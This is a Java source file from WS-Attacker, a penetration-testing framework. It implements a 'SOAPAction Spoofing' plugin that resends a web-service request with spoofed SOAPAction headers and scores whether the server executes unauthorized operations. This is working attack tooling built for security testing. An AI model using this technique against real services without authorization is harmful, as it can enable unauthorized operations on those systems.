/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework
 * Copyright (C) 2010 Christian Mainka
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
package wsattacker.plugin.soapActionSpoofing;

import java.util.List;

import javax.xml.soap.SOAPElement;
import javax.xml.soap.SOAPException;
import javax.xml.soap.SOAPMessage;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathConstants;
import javax.xml.xpath.XPathExpressionException;
import javax.xml.xpath.XPathFactory;

import org.apache.xmlbeans.XmlException;
import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.xml.sax.SAXException;

import wsattacker.main.composition.plugin.AbstractPlugin;
import wsattacker.main.composition.plugin.option.AbstractOption;
import wsattacker.main.composition.plugin.option.AbstractOptionBoolean;
import wsattacker.main.composition.plugin.option.AbstractOptionChoice;
import wsattacker.main.composition.plugin.option.AbstractOptionVarchar;
import wsattacker.main.composition.testsuite.RequestResponsePair;
import wsattacker.main.plugin.PluginState;
import wsattacker.main.plugin.option.OptionSimpleBoolean;
import wsattacker.main.plugin.option.OptionSimpleVarchar;
import wsattacker.main.testsuite.TestSuite;
import wsattacker.plugin.soapActionSpoofing.option.OptionSoapAction;
import wsattacker.util.SoapUtilities;
import wsattacker.util.SortedUniqueList;

import com.eviware.soapui.impl.wsdl.WsdlInterface;
import com.eviware.soapui.impl.wsdl.WsdlOperation;
import com.eviware.soapui.impl.wsdl.WsdlRequest;
import com.eviware.soapui.impl.wsdl.WsdlSubmit;
import com.eviware.soapui.impl.wsdl.WsdlSubmitContext;
import com.eviware.soapui.impl.wsdl.support.soap.SoapUtils;
import com.eviware.soapui.model.iface.Operation;
import com.eviware.soapui.model.iface.Request.SubmitException;

public class SoapActionSpoofing extends AbstractPlugin {
	private static final long serialVersionUID = 1L;
	private AbstractOptionBoolean automaticOption;
	private AbstractOptionChoice operationChooserOption;
	private AbstractOptionVarchar actionOption;
	private transient WsdlRequest originalRequest, attackRequest; // for loading a config, only options are important
	private String originalAction;
	
	@Override
	public void initializePlugin() {
		automaticOption = new OptionSimpleBoolean("Automatic", true,
				"Choose SOAPAction automatically");
		operationChooserOption = new OptionSoapAction("Operation",
				"Choose action manually");
		actionOption = new OptionSimpleVarchar("Action", "",
				"Concrete action uri");
		getPluginOptions().add(automaticOption);
		setState(PluginState.Ready);
		originalRequest = null;
		originalAction = null;
	}

	@Override
	public String getName() {
		return "SOAPAction Spoofing";
	}

	@Override
	public String getDescription() {
		return "This attack plugin checks if the server is vulnerable to SOAPAction Spoofing.\n" +
				"In automatic mode, all SOAPAction Headers, which are present in the WSDL, are used.\n" +
				"Manual mode can be used to use only a specific operation, \n" +
				"e.g. a public operation which does not damage the server.";
	}

	@Override
	public String getAuthor() {
		return "Christian Mainka";
	}

	@Override
	public String getVersion() {
		return "1.0 / 2010-11-30";
	}

	@Override
	public int getMaxPoints() {
		return 3;
	}

	@Override
	public void attackImplementationHook(RequestResponsePair original) {
		
		// save needed pointers
		originalRequest = original.getWsdlRequest();
		originalAction = originalRequest.getOperation().getAction();
		attackRequest = originalRequest.getOperation().addNewRequest(getName() + " ATTACK");
		// create an attack request
		originalRequest.copyTo(attackRequest, true, true);

		
		// detect first body child
		Node originalChild;
		try {
			originalChild = getBodyChild(original.getWsdlResponse().getContentAsString());
			info("Using first SOAP Body child '" + originalChild.getNodeName() + "' as reference");
		} catch (Exception e) {
			log().error("Could not detect first body child from response content. Plugin aborted \n" + originalRequest.getResponse().getContentAsString());
			setState(PluginState.Failed);
			return;
		}
		
		// get attacking action
		if (automaticOption.isOn()) {
			info("Automatic Mode");
			info("Creating attack vector");
			List<String> attackActions = findAttackActions(originalRequest);
			int anz = attackActions.size();
			if (anz == 0) {
				info("Could not find any suitable SOAPActions\n" +
				     "This could indicate, that the server does not use SOAPAction Header\n" +
				     "You could also choose a SOAPAction manually");
				setState(PluginState.Failed);
			} else {

				info("Found " + anz + " suitable SOAPActions: " + attackActions.toString());
				trace("Starting attack for each vector");
				for (String soapAction : attackActions) {
					if ( getCurrentPoints() == getMaxPoints() ) {
						// we can stop if we already got maximum number of points
						info("Stopping attack since we got the maximum number of points (" + getMaxPoints() + ")");
						break;
					}
					doAttackRequest(attackRequest, soapAction, originalChild);
				}
				setState(PluginState.Finished);
			}
		} else {
			info("Manual Mode");
			doAttackRequest(attackRequest, actionOption.getValueAsString(), originalChild);
		}
		// remove attack request
		originalRequest.getOperation().removeRequest(attackRequest);
		// delete references
		attackRequest = null;
		originalAction = null;
		originalRequest = null;
		switch (getCurrentPoints()) {
		case 0:
			info("(0/3) Points: No attack possible. The Web Service is not vulnerable.");
			break;
		case 1:
			important("(1/3) Points: The server seems to have problems with the attack vectors. It should always return a SOAP Fault.");
			break;
		case 2:
			critical("(2/3) Points: The server ignores SOAPAction Header.\n" +
			"This can be abused to execute unauthorized operations, if authentication is controlled by HTTP.");
			break;
		case 3:
			critical("(3/3) Points: The server executes the Operation specified by the SOAPAction Header.\n" +
			"This can be abused to execute unauthorized operations, if authentication is controlled by the SOAP message.");
			break;
		}
	}

	private void doAttackRequest(WsdlRequest request, String soapAction, Node originalChild) {
		// set SOAPAction
		info("Using SOAPAction Header '" + soapAction + "'");
		request.getOperation().setAction(soapAction);

		try {
			WsdlSubmit<WsdlRequest> submit = request.submit(new WsdlSubmitContext(request), false);
			String responseContent = submit.getResponse().getContentAsString();
			if (responseContent == null) {
				important("The server's answer was empty. Server misconfiguration?\n" +
						"Got 1/3 Points");
				setCurrentPoints(1);
				return;
			}
			trace("Request:\n" + submit.getRequest().getRequestContent() + "\n\nResponse:\n" + responseContent);
			try {
				if( SoapUtils.isSoapFault(responseContent, request.getOperation().getInterface().getSoapVersion())) {
					info("No attack possible, you got a SOAP error message.");
					// exit
					return;
				}
			} catch (XmlException e) {
				info("The answer is not valid XML. Server missconfiguration?");
				setCurrentPoints(1);
			}
			// determine which operation corresponds to the response
			Node responseChild;
			try {
				responseChild = getBodyChild(responseContent);
				if(responseChild == null) {
					important("There is no Child in the SOAP Body. Misconfigured Server?\n" +
							"Got 1/3 Points.");
					setCurrentPoints(1);
					return;
				}
				info("Detected first body child: '" + responseChild.getNodeName() + "'");
			// this is for using getBodyChildWithXPath()
//			} catch (SAXException e) {
//				warn("Could not detect first body child from response content. Attack aborted \n" + responseContent);
//				return;
			} catch (SOAPException e) {
				info("Could not parse response. " + e.getMessage());
				return;
			}
			if (responseChild.getNodeName().equals(originalChild.getNodeName())) {
				important("The server ignored the SOAPAction Header. It still executes the first child of the Body.\n" +
						"Got 2/3 Points");
				setCurrentPoints(2);
			} else {
				important("The server accepts the SOAPAction Header " + soapAction + " and executes the corresponding operation.\n" + 
						"Got 3/3 Points");
				setCurrentPoints(3);
			}
		} catch (SubmitException e) {
			info("Could not submit the request. " + e.getMessage());
		} finally {
			request.getOperation().setAction(originalAction);
		}
	}
	
	@Override
	public void clean() {
		setCurrentPoints(0);
		setState(PluginState.Ready);
	}

	@Override
	public void stopHook() {
		// restore possible data corruption
		if(originalAction != null && originalRequest != null && !originalRequest.getOperation().getAction().equals(originalAction)) {
			originalRequest.getOperation().setAction(originalAction);
			originalRequest = null;
			originalAction = null;
		}
		if(attackRequest != null) {
			attackRequest.getOperation().removeRequest(attackRequest);
			attackRequest = null;
		}
	}

	@Override
	public boolean wasSuccessful() {
		// successfull only server is vulnerable for one method
		// note: one point = possible server misconfiguration
		return isFinished() && (getCurrentPoints() > 1);
	}

	private void checkState() {
		if (automaticOption.isOn()) {
			setState(PluginState.Ready);
		} else {
			if (operationChooserOption.getChoice() > 0) {
				setState(PluginState.Ready);
			}
		}
	}

	@Override
	public void optionValueChanged(AbstractOption option) {
		if (option == automaticOption) {
			if (automaticOption.isOn()) {
				getPluginOptions().remove(operationChooserOption);
				getPluginOptions().remove(actionOption);
			} else {
				getPluginOptions().add(operationChooserOption);
				getPluginOptions().add(actionOption);
			}
		} else if (option == operationChooserOption) {
			// try to get action by operationname
			try {
				actionOption.setValue(TestSuite
						.getInstance()
						.getCurrentService()
						.getWsdlService()
						.getOperationByName(
								operationChooserOption.getValueAsString())
						.getAction());
			} catch (NullPointerException e) {
				actionOption.setValue("No current Service");
			} catch (Exception e) {
				actionOption.setValue("Error: " + e.getMessage());
			}
		}
		checkState();
	}
	
	@Override
	public String[] getCategory() {
		return new String[] {"Spoofing Attacks"};
	}

	public AbstractOptionBoolean getAutomaticOption() {
		return automaticOption;
	}

	public AbstractOptionChoice getOperationChooserOption() {
		return operationChooserOption;
	}

	public AbstractOptionVarchar getActionOption() {
		return actionOption;
	}

	private List<String> findAttackActions(WsdlRequest request) {
		List<String> ret = new SortedUniqueList<String>();
		// Get the responding interface
		WsdlInterface iface = request.getOperation().getInterface();
		// loop through all available operations
		for (Operation op : iface.getOperationList()) {
			if (op instanceof WsdlOperation) {
				// add action to return list
				String action = ((WsdlOperation) op).getAction();
				ret.add(action);
			}
		}
		// remove current request action, since this action can not
		// be used for SOAPAction Spoofing
		ret.remove(request.getOperation().getAction());
		return ret;
	}
	
	/**
	 * Gets the first child of the SOAP Body from an XML String.
	 * This Version uses XPath.
	 * @param xmlContent
	 * @return
	 * @throws SAXException
	 */
	public Node getBodyChildWithXPath(String xmlContent) throws SAXException {
		
//		final String SEARCH = "/*[namespace::'http://www.w3.org/2003/05/soap-envelope']";
		String SEARCH = "/Envelope/Body/*[1]";
		Document doc = SoapUtilities.stringToDom(xmlContent);
		XPath xpath = XPathFactory.newInstance().newXPath();
		Node node = null;
		try {
			node = (Node) xpath.evaluate(SEARCH, doc, XPathConstants.NODE);
		} catch (XPathExpressionException e) {
			e.printStackTrace();
		}
		return node;
	}
	
	/**
	 * Gets the first child of the SOAP Body from an XML String.
	 * This does exactly the same as getBodyChildWithXPath but it
	 * demonstrates the power of WS-Attackers SoapUtilities.
	 * @param xmlContent
	 * @return
	 * @throws SOAPException
	 */
	public Node getBodyChild(String xmlContent) throws SOAPException {
		SOAPMessage sm = SoapUtilities.stringToSoap(xmlContent);
		// we need to return the first soapChild because there could also
		// be a TextNode (whitespaces) as sm.getSOAPBody().getFirstChild()
		List<SOAPElement> bodyChilds = SoapUtilities.getSoapChilds(sm.getSOAPBody());
		if(bodyChilds.size() > 0) {
			return bodyChilds.get(0);
		}
		else {
			return null;
		}
	}
	
	@Override
	public void restoreConfiguration(AbstractPlugin plugin) {
		if (plugin instanceof SoapActionSpoofing) {
			SoapActionSpoofing old = (SoapActionSpoofing) plugin;
			// restore automatic mode
			automaticOption.setOn(old.getAutomaticOption().isOn());
			// try to restore chooser
			actionOption.setValue(old.getActionOption().getValue());
			operationChooserOption.setChoice(old.getOperationChooserOption().getValueAsString());
		}
	}

}
